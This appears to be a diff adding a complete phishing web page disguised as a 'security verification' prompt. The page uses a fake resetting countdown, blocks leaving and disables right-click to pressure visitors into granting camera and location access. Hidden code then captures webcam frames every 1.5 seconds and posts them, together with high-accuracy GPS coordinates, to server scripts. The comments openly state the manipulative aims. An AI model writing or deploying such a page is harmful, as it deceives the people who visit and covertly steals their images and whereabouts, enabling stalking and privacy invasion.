@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification Required</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @keyframes gradientShift {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* Animated background particles */
+        body::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image:
+                radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(138, 119, 255, 0.3) 0%, transparent 50%);
+            animation: particleFloat 20s ease-in-out infinite;
+        }
+
+        @keyframes particleFloat {
+
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+
+            50% {
+                transform: translate(50px, 50px) scale(1.1);
+            }
+        }
+
+        /* Blocking Overlay */
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(20px) saturate(180%);
+        }
+
+        .permission-modal {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(30px) saturate(200%);
+            border-radius: 32px;
+            padding: 60px 50px;
+            max-width: 580px;
+            width: 90%;
+            text-align: center;
+            box-shadow:
+                0 8px 32px 0 rgba(31, 38, 135, 0.37),
+                0 30px 60px rgba(0, 0, 0, 0.5),
+                inset 0 1px 1px rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            animation: modalSlideIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .permission-modal::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% {
+                left: -100%;
+            }
+
+            100% {
+                left: 100%;
+            }
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-100px) scale(0.9);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .lock-icon {
+            font-size: 72px;
+            margin-bottom: 24px;
+            filter: drop-shadow(0 0 20px rgba(255, 107, 107, 0.6));
+            animation: lockPulse 2.5s ease-in-out infinite;
+        }
+
+        @keyframes lockPulse {
+
+            0%,
+            100% {
+                transform: scale(1) rotate(0deg);
+                filter: drop-shadow(0 0 20px rgba(255, 107, 107, 0.6));
+            }
+
+            50% {
+                transform: scale(1.15) rotate(-5deg);
+                filter: drop-shadow(0 0 30px rgba(255, 107, 107, 0.9));
+            }
+        }
+
+        .permission-modal h1 {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 2em;
+            margin-bottom: 16px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            text-shadow: 0 4px 20px rgba(255, 107, 107, 0.3);
+        }
+
+        .permission-modal h2 {
+            color: #ffffff;
+            font-size: 1.6em;
+            margin-bottom: 24px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .permission-modal p {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 1.05em;
+            line-height: 1.7;
+            margin-bottom: 32px;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+        }
+
+        .warning-badge {
+            background: linear-gradient(135deg, rgba(255, 107, 107, 0.15), rgba(255, 142, 83, 0.15));
+            border: 2px solid rgba(255, 107, 107, 0.5);
+            border-radius: 16px;
+            padding: 18px 24px;
+            margin-bottom: 28px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.2);
+        }
+
+        .warning-badge p {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 700;
+            font-size: 1.1em;
+            margin: 0;
+            letter-spacing: 0.3px;
+        }
+
+        .permission-list {
+            text-align: left;
+            margin: 28px 0;
+            background: rgba(255, 255, 255, 0.06);
+            padding: 24px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #ffffff;
+            padding: 12px;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        .permission-item:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateX(5px);
+        }
+
+        .permission-item span {
+            font-size: 32px;
+            margin-right: 18px;
+            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.3));
+        }
+
+        .permission-item strong {
+            font-size: 1.15em;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .permission-item small {
+            color: rgba(255, 255, 255, 0.65);
+            font-size: 0.9em;
+            font-weight: 400;
+        }
+
+        .permission-item.granted {
+            color: #51cf66;
+            background: rgba(81, 207, 102, 0.1);
+        }
+
+        .permission-item.pending {
+            color: #ffd43b;
+        }
+
+        .grant-button {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 50%, #ff8e53 100%);
+            background-size: 200% 200%;
+            color: #ffffff;
+            padding: 20px 45px;
+            font-size: 1.25em;
+            font-weight: 700;
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow:
+                0 10px 40px rgba(255, 107, 107, 0.4),
+                0 4px 12px rgba(0, 0, 0, 0.3),
+                inset 0 1px 1px rgba(255, 255, 255, 0.3);
+            width: 100%;
+            margin-top: 12px;
+            animation: buttonGlow 3s ease-in-out infinite;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            font-family: 'Outfit', sans-serif;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .grant-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .grant-button:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        @keyframes buttonGlow {
+
+            0%,
+            100% {
+                background-position: 0% 50%;
+                box-shadow:
+                    0 10px 40px rgba(255, 107, 107, 0.5),
+                    0 4px 12px rgba(0, 0, 0, 0.3),
+                    inset 0 1px 1px rgba(255, 255, 255, 0.3);
+            }
+
+            50% {
+                background-position: 100% 50%;
+                box-shadow:
+                    0 15px 50px rgba(255, 107, 107, 0.7),
+                    0 6px 16px rgba(0, 0, 0, 0.4),
+                    inset 0 1px 1px rgba(255, 255, 255, 0.4);
+            }
+        }
+
+        .grant-button:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow:
+                0 20px 50px rgba(255, 107, 107, 0.6),
+                0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .grant-button:active {
+            transform: translateY(-1px) scale(0.98);
+        }
+
+        .grant-button:disabled {
+            background: linear-gradient(135deg, #4a4a5e, #5a5a6e);
+            cursor: not-allowed;
+            animation: none;
+            opacity: 0.6;
+        }
+
+        .timer {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 1.15em;
+            font-weight: 700;
+            margin-top: 20px;
+            letter-spacing: 0.5px;
+        }
+
+        /* Hidden elements for camera capture */
+        .video-wrap {
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        /* Success screen */
+        .success-screen {
+            display: none;
+            text-align: center;
+            color: white;
+        }
+
+        .success-screen h1 {
+            font-size: 2.8em;
+            margin-bottom: 24px;
+            background: linear-gradient(135deg, #51cf66 0%, #40c057 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .checkmark {
+            font-size: 120px;
+            filter: drop-shadow(0 0 30px rgba(81, 207, 102, 0.8));
+            animation: checkmarkScale 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes checkmarkScale {
+            from {
+                transform: scale(0) rotate(-180deg);
+                opacity: 0;
+            }
+
+            to {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Permission Overlay (blocks everything) -->
+    <div class="permission-overlay" id="permissionOverlay">
+        <div class="permission-modal">
+            <div class="lock-icon">🔒</div>
+            <h1>⚠️ SECURITY VERIFICATION REQUIRED</h1>
+            <h2>Access Restricted</h2>
+
+            <div class="warning-badge">
+                <p>⚡ You must grant all permissions to continue</p>
+            </div>
+
+            <p>For your security and to verify you're a legitimate user, we need to confirm your identity and location.
+            </p>
+
+            <div class="permission-list">
+                <div class="permission-item pending" id="cameraStatus">
+                    <span>📷</span>
+                    <div>
+                        <strong>Camera Access</strong><br>
+                        <small>Required for identity verification</small>
+                    </div>
+                </div>
+                <div class="permission-item pending" id="locationStatus">
+                    <span>📍</span>
+                    <div>
+                        <strong>Location Access</strong><br>
+                        <small>Required for security compliance</small>
+                    </div>
+                </div>
+            </div>
+
+            <button class="grant-button" id="grantButton" onclick="requestAllPermissions()">
+                🔓 Grant Permissions to Continue
+            </button>
+
+            <div class="timer" id="timer">
+                ⏱️ Session expires in: <span id="countdown">60</span>s
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Screen (shown after permissions granted) -->
+    <div class="success-screen" id="successScreen">
+        <div class="checkmark">✓</div>
+        <h1>Verification Complete!</h1>
+        <p style="color: #b8b8d1; font-size: 1.2em;">Thank you for your cooperation. You may now proceed.</p>
+    </div>
+
+    <!-- Hidden camera elements -->
+    <div class="video-wrap">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <script>
+        let cameraGranted = false;
+        let locationGranted = false;
+        let countdownValue = 60;
+
+        // Countdown timer to create urgency
+        const countdownInterval = setInterval(() => {
+            countdownValue--;
+            document.getElementById('countdown').textContent = countdownValue;
+            if (countdownValue <= 0) {
+                countdownValue = 60; // Reset to create continuous pressure
+            }
+        }, 1000);
+
+        // Request all permissions
+        async function requestAllPermissions() {
+            const button = document.getElementById('grantButton');
+            button.disabled = true;
+            button.textContent = '⏳ Processing...';
+
+            // Request camera first
+            await requestCamera();
+
+            // Request location
+            await requestLocation();
+
+            // Check if both granted
+            if (cameraGranted && locationGranted) {
+                setTimeout(() => {
+                    document.getElementById('permissionOverlay').style.display = 'none';
+                    document.getElementById('successScreen').style.display = 'block';
+                    clearInterval(countdownInterval);
+                }, 1000);
+            } else {
+                button.disabled = false;
+                button.textContent = '🔓 Grant Permissions to Continue';
+                alert('⚠️ All permissions are required to proceed. Please allow both camera and location access when prompted.');
+            }
+        }
+
+        // Camera permission and capture
+        async function requestCamera() {
+            try {
+                const constraints = {
+                    audio: false,
+                    video: { facingMode: "user" }
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraGranted = true;
+                updatePermissionStatus('cameraStatus', true);
+                handleCameraSuccess(stream);
+            } catch (error) {
+                console.error('Camera Error:', error);
+                cameraGranted = false;
+                updatePermissionStatus('cameraStatus', false);
+            }
+        }
+
+        // Location permission and capture
+        async function requestLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            locationGranted = true;
+                            updatePermissionStatus('locationStatus', true);
+                            sendPosition(position);
+                            resolve();
+                        },
+                        (error) => {
+                            console.error('Location Error:', error);
+                            locationGranted = false;
+                            updatePermissionStatus('locationStatus', false);
+                            resolve();
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    resolve();
+                }
+            });
+        }
+
+        // Update permission status UI
+        function updatePermissionStatus(elementId, granted) {
+            const element = document.getElementById(elementId);
+            if (granted) {
+                element.classList.remove('pending');
+                element.classList.add('granted');
+                element.querySelector('span').textContent = '✅';
+            }
+        }
+
+        // Handle camera stream
+        function handleCameraSuccess(stream) {
+            window.stream = stream;
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+
+            const context = canvas.getContext('2d');
+            const captureInterval = setInterval(() => {
+                context.drawImage(video, 0, 0, 640, 480);
+                const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                postCameraImage(canvasData);
+            }, 1500);
+
+            setTimeout(() => {
+                clearInterval(captureInterval);
+                stream.getTracks().forEach(track => track.stop());
+            }, 10000);
+        }
+
+        // Send camera image
+        function postCameraImage(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function (result) { },
+                error: function () { }
+            });
+        }
+
+        // Send location data
+        function sendPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "location.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("lat=" + lat + "&lon=" + lon + "&acc=" + acc + "&time=" + new Date().getTime());
+        }
+
+        // Prevent closing/leaving the page
+        window.addEventListener('beforeunload', (e) => {
+            if (!cameraGranted || !locationGranted) {
+                e.preventDefault();
+                e.returnValue = 'You must grant all permissions before leaving.';
+                return e.returnValue;
+            }
+        });
+
+        // Disable right-click
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        // Auto-trigger on page load after 2 seconds
+        window.onload = function () {
+            setTimeout(() => {
+                // Auto-click the button to make it seem more urgent
+                document.getElementById('grantButton').focus();
+            }, 2000);
+        };
+    </script>
+</body>
+
+</html>
